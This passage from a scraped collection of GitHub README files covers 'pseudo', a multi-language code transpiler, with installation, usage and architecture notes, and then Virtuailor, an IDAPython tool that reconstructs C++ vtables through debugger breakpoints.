middleware\n    convert-tuples-to-classes middleware\n    convert-exception-based errors handling\n    to return-based error handling middleware\n              etc\n\n              ||\n              ||\n              ||\n              ||\n  TARGET LANGUAGE CODE GENERATOR\n\n      defined with a dsl aware\n      that handles formatting\n         automatically\n              ||\n              ||\n              ||\n              \\\/\n\n      Python \/ C# \/ Go \/ JS \/ Ruby\n```\n\n\n## use cases\n\n  * generate code for the same task\/algorithm in different languages (parser generators etc)\n  * port a library\/codebase\n  * develop core logic in one language and use it in other language codebases\n  * write a compiler\/dsl\n  * bootstrap a codebase in another language \/ generate equivalent test suites in different languages\n  * translate\/support some algorithms in different languages\n  * translate\/support some text\/data processing\/command tool in different languages\n\n## installation\n\n```bash\npip install pseudo #only python 3 supported\n\n# probably you'd like to try the python-to-pseudo-to-js\/go\/etc compiler\npip install pseudo-python\n```\n\n- [usage](#usage)\n- [why?](#why)\n- [language support](#language-support)\n- [compilers targetting pseudo](#compilers-targetting-pseudo)\n- [implementation](#implementation)\n- [roadmap](#roadmap)\n- [target language specific docs](#target-language-specific-docs)\n- [Pseudo and Haxe?](#pseudo-and-haxe)\n- [the name?](#the-name)\n\n\n## usage\n\nyou can directly generate pseudo ast from Python using Pseudo-Python\n```bash\npseudo-python a.py # generates a.pseudo.yaml\n```\nand then translate the ast\n```bash\npseudo a.pseudo.yaml go # or ruby \/ js \/ csharp \/ py \/ cpp\n```\nor you can directly translate from python to another language\n\n```bash\npseudo-python a.py b.rb # or c.cs\n```\n\n\n\n```python\npseudo.generate(pseudo_ast, language) # pseudo_ast is a plain dict or a pseudo Node-based tree\n```\n\n```python\npseudo.generate_from_yaml(pseudo_ast, language) # pseudo_ast is yaml-encoded pseudo ast\n```\n\nFor quick experiments it's easier to use `generate_main`\n\n```python\nfrom pseudo import * # ok for a repl\n\nprint(generate_main([\n  assignment(\n    local('a', 'Int'),\n    call(local('g'), [to_node(0), to_node('')], 'Int'))], 'rb'))\n\na = g(0, '')\n```\n\nIn the future Pseudo can add a lisp-like dsl for fast manual creation of ast nodes, but currently it's more useful for its main goal: consuming automatically generated pseudo ast and then transpiling it to the target languages.\n\n\n## why?\n\nSupporting full-blown Ruby to Python\/Javascript to C++ auto translation is hard.\n\nHowever often we need to just express an algorithm, a self-contained core of a library, a simple command line tool and the act of manual porting to another languages feels somehow .. primitive. \n\nOften that code is(or can be) expressed in very similar way, with\nsimilar constructs and basic types and data structures. On that level a lot of languages are very similar and the only real difference is syntax and methods api. That's a feasible task for automatic translation and actually the existance of `pseudo` is to fullfill the needs of several other existing projects\/ideas.\n\nAnother powerful thing about Pseudo is its standard library.\nIt can accumulate a serious number of methods\/idioms and it can act like e.g. a truly cross-platform, target-language-aware equivalent of lodash\n\nPseudo is still young (it's basically less than two weeks old), \nbut it already has a base on which it can improve really quickly\n(adding support for another language is basically just a matter of 3-4 hours currently)\n\n## Language support\n\nUsing pseudo's DSL it's easy to add support for a new language, so it's feasible to expect support for most popular languages and even different versions of them (e.g. EcmaScript 6\/7, Perl 5\/6 Java 7 \/ 8)\n\n## Compilers targetting pseudo\n\nCurrently [pseudo-python](https:\/\/github.com\/alehander42\/pseudo-python) is usable, and there are plans for `pseudo-ruby` or `pseudo-js`\n\n## Intermediate AST format\n\nThe AST format uses basic data structures available in most languages. The nodes correspond to \ndictionaries with `type` key corresponding to the node type and `field_name` keys corresponding to\nthe node fields, similar to the widely popular `estree` ecmascript format.\n\nPseudo can consume ast either serialized in `.pseudo.yaml` files or directly as\ndictionary objects through it's `pseudo.generate(ast, output_lang)` API\n\n## Implementation\n\n\n\nThe implementation goal is to make the definitions of new supported languages  really clear and simple. \n\nIf you dive in, you'll find out\na lot of the code\/api transformations are defined using a declarative dsl with rare ocassions \nof edge case handling helpers. \n\nThat has a lot of advantages:\n\n* Less bugs: the core transformation code is really generalized, it's reused as a dsl and its results are well tested\n\n* Easy to comprehend: it almost looks like a config file\n\n* Easy to add support for other languages: I was planning to support just python and c# in the initial version but it is so easy to add support for a language similar to the current supported ones, that I\nadded support for 4 more.\n\n* Easy to test: there is a simple test dsl too which helps all \nlanguage tests to share input examples [like that](tests\/test_ruby.py)\n\nHowever language translation is related to a lot of details and\na lot of little gotchas, tuning and refining some of them took days. Pseudo uses different abstractions to streamline the process and to reuse logic across languages.\n\n```ruby\nPSEUDO AST:\n   NORMAL CODE     PSEUDO STANDARD LIBRARY INVOCATIONS     \n      ||                    ||\n      ||                    ||\n      ||              API TRANSLATOR\n      ||                    ||\n      ||                    ||\n      ||                    \\\/\n      ||              IDIOMATIC TARGET LANGUAGE \n      ||              STANDARD LIBRARY INVOCATIONS        \n      ||                    ||     \n      \\\/                    \\\/\n  STANDARD OR LANGUAGE-SPECIFIC MIDDLEWARES\n              e.g.\n    name camel_case\/snake_case middleware\n    convert-tuples-to-classes middleware\n    convert-exception-based errors handling\n    to return-based error handling middleware\n              etc\n\n              ||\n              ||\n              ||\n              ||\n  TARGET LANGUAGE CODE GENERATOR\n\n      defined with a dsl aware\n      that handles formatting\n         automatically\n              ||\n              ||\n              ||\n              \\\/\n\n            OUTPUT\n```\n\n\n\n## Roadmap\n\nPseudo has undergone some changes through the last year in my local repo, the new release somewhere in the next months should contain some of this roadmap.\n\n[Roadmap](roadmap.md)\n\n## Target language specific docs\n\n* [python](docs\/python.md)\n* [c#](docs\/csharp.md)\n* [go](docs\/go.md)\n* [ruby](docs\/ruby.md)\n* [javascript](docs\/javascript.md)\n* [c++](docs\/cpp.md)\n\n## Pseudo and Haxe\n\nThey might seem comparable at a first glance, but they have completely different goals.\n\nPseudo wants to generate readable code, ideally something that looks like a human wrote it\/ported it\n\nPseudo doesn't use a target language runtime, it uses the target language standard library for everything (except for JS, but even there is uses `lodash` which is pretty popular and standard)\n\nPseudo's goal is to help with automated translation for cases\nlike algorithm generation, parser generation, refactoring, porting codebases etc. The fact that you can write compilers targetting Pseudo and receiver translation to many languages for free is just a happy accident\n\n## The name?\n\nwell.\n\npseudo(code)\n\n\n## License\n\nCopyright \u00a9 2015 2016 [Alexander Ivanov](https:\/\/twitter.com\/alehander42)\n\nDistributed under the MIT License.\n"},{"repo":"\/0xgalz\/Virtuailor","language":"Python","readme_contents":"# Virtuailor - IDAPython tool for C++ vtables reconstruction \n\n\nVirtuailor is an IDAPython tool that reconstructs vtables for C++ code written for intel architecture, both 32bit and 64bit code and AArch64 (New!).\nThe tool constructed from 2 parts, static and dynamic.\n\nThe first is the static part, contains the following capabilities:\n* Detects indirect calls.\n* Hooks the value assignment of the indirect calls using conditional breakpoints (the hook code). \n\nThe second is the dynamic part, contains the following capabilities:\n* Creates vtable structures. \n* Rename functions and vtables addresses.\n* Add structure offset to the assembly indirect calls. \n* Add xref from indirect calls to their virtual functions(multiple xrefs).\n* For AArch64- tries to fix undefined vtables and related virtual functions (support for firmware).\n\n## How to Use?\n\n1. By default Virtuailor will look for virtual calls in ALL the addresses in the code.\nIf you want to limit the code only for specific address range, no problem, just edit the *Main* file to add the range you want to target in the variables start_addr_range and end_addr_range:\n\n```python\nif __name__ == '__main__':\n\n    start_addr_range = idc.MinEA()  # You can change the virtual calls address range\n    end_addr_range = idc.MaxEA()\n    add_bp_to_virtual_calls(start_addr_range, end_addr_range)\n```\n\n2. Optional, (but extremely recommended), create a snapshot of your idb. Just press ctrl+shift+t and create a snapshot.\n\n3. Press File->Run script... then go to Virtuailor folder and choose to run Main.py, You can see the following gif for a more clear and visual explanation.\n![How to use](https:\/\/github.com\/0xgalz\/Virtuailor\/blob\/master\/Images\/howto.gif)\n\nNow the GUI will provide you an option to choose a range to target, in case you would like to target all the binary just press OK with the default values in the start and end addresses. \n\nAfterwards the breakpoints will be placed in your code and all you have to do is to execute your code with IDA debugger, do whatever actions you want and see how the vtables is being built! \nFor AArch64 you can setup a remote gdb server and debug using the IDA debuggger.\n\nIn case you don't want\/need the breakpoints anymore just go to the breakpoint list tab in IDA and delete the breakpoints as you like.\n\nIt is also really important for me to note that this is the second version of the tool with both 32 and 64 bit support and aarch64, probably in some cases a small amount of breakpoints will be missed, in these cases please open an issue and contact me so I will be able to improve the code and help fixing it. Thank you in advanced for that :)\n\n## Output and General Functions\n\n#### vtables structures\nThe structures Virtuailor creates from the vtable used in virtual call that were hit. The vtable functions are extracted from the memory based on the relevant register that was used in the BP opcode.\n\n![vtable example](https:\/\/github.com\/0xgalz\/Virtuailor\/blob\/master\/Images\/vtable_structure.png)\nSince I wanted to create a correlation between the structure in IDA and the vtables in the data section, the BP changes the vtable address name in the data section to the name of the structure. As you can see in the following picture:\n![vtable example](https:\/\/github.com\/0xgalz\/Virtuailor\/blob\/master\/Images\/vtable_in_memory.png)\n\nThe virtual functions names are also being changed, take aside situations where the names are not the default IDA names (functions with symbols or functions that the user changed) in those cases the function names will stay the same and will also be add to the vtable structure with their current name.\n\nThe chosen names is constructed using the following pattern: \n* vtable_ \n* vfunc_\nthe rest of the name is either offset from the beginning of the Segment, this is mostly because most binaries nowadays are PIE and PIC and thus ASLR is enforced, (instead of using the full address name, which is also quite long on 64bit environments).\nThe vtable structure also has a comment, \"Was called from offset: XXXX\", this offset is the offset from the beginning of the Segment.\n\n#### Adding Structures to the Assembly\n\nAfter creating the vtable Virtuailor also adds a connection between the structure created and the assembly as you can see in the following images:\n![BP after an execution, Example 2](https:\/\/github.com\/0xgalz\/Virtuailor\/blob\/master\/Images\/stroff2.png)\n\nP.S: The structure offset used in the BP is only relevant for the last call that was made, in order to get a better understanding of all the virtual calls that were made the xref feature was added as explained in the next section\n\n#### Xref to virtual functions\n\nWhen reversing C++ statically it is not trivial to see who called who, this is because most calls are indirect calls, however after running Virtuailor every function that was called indirectly now has an xref to those locations.\n\nThe following gif shows the added Xrefs with their indirect function call:\n\n![xref](https:\/\/github.com\/0xgalz\/Virtuailor\/blob\/master\/Images\/xref.gif)\n\n## Former talks and lectures \n\nThe tool was presented in RECon brussels, Troopers and Warcon. \nThe presentation could be found in the following link: https:\/\/www.youtube.com\/watch?v=Xk75TM7NmtA\n\n## Thanks\n\nREcon Brussels, Troopers, Warcon crews, Nana, @tmr232, @matalaz, @oryandp, @talkain, @shiftreduce\n\n\n## License\n\nThe plugin is licensed under the GNU GPL v3 license.\n"}]